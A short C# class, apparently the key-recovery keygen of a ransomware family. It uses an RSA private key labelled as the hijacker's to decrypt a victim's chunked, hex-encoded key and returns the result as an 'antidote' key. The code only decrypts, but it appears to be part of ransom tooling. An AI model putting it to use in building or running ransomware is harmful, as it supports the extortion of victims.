using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Keygen
{
    class VICTIM
    {
        public static VICTIM Instance = new VICTIM();
        private RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
        public string HIJACKER_PRIVATE_KEY {
            set
            {
                RSA.FromXmlString(value);
            }
        }
        public string VICTIM_KEY
        {
            set
            {
                var temp = value.Split('z')
                    .Select(chunk => 
                        RSA.Decrypt(Utils.HexToBytes(chunk), false));

                byte[] rv = new byte[temp.Sum(a => a.Length)];
                int offset = 0;
                foreach (var temp2 in temp)
                {
                    System.Buffer.BlockCopy(temp2, 0, rv, offset, temp2.Length);
                    offset += temp2.Length;
                }
                
                PRIVATE_KEY = string.Join("", Utils.Split(BitConverter.ToString(rv).Replace("-", "").ToLower(), 4).Select(chunk => chunk.Substring(0, 2)));
            }
        }
        private string PRIVATE_KEY;
        public string ANTIDODE_KEY
        {
            
            get
            {
                return PRIVATE_KEY;
            }
        }
    }
}
